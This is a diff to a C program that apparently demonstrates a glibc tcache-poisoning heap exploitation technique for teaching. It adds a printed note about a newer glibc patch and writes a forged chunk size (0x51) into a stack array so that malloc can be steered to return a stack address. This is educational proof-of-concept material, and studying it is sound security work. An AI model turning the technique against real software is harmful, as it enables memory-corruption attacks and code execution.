@@ -16,6 +16,8 @@ int main(){
 	printf("After the patch https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41,\n"
 		   "An heap address leak is needed to perform this attack.\n"
 		   "The same patch also ensures the chunk returned by tcache is properly aligned.\n\n");
+	printf("After the patch https://patchwork.sourceware.org/project/glibc/patch/20250206213709.2394624-2-benjamin.p.kallus.gr@dartmouth.edu/,\n"
+		   "We need to control at least 8 byte before the region we want to allocate to (to forge the size).\n\n");
 
 	// Allocate 14 times so that we can free later.
 	char* ptrs[14];
@@ -50,7 +52,8 @@ int main(){
 	// Create an array on the stack and initialize it with garbage.
 	size_t stack_var[6];
 	memset(stack_var, 0xcd, sizeof(stack_var));
-	
+	stack_var[1] = 0x51;
+
 	printf("The stack address that we intend to target: %p\n"
 		   "It's current value is %p\n", &stack_var[2], (char*)stack_var[2]);
 	
